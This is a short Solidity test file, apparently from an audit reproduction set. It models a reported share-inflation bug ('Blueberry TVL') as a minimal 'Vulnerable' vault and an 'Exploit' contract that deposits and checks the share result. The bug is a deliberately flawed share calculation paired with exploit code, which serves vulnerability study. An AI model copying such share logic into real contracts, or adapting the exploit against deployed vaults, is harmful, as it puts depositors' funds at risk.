// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 61480: Blueberry TVL share inflation. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public totalAssets = 100; uint256 public inFlight = 100; uint256 public shares; function deposit(uint256 amount) external returns (uint256) { shares = amount * 1e18 / totalAssets; return shares; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.deposit(100); success = bug.shares() == 1e18;
    }
}


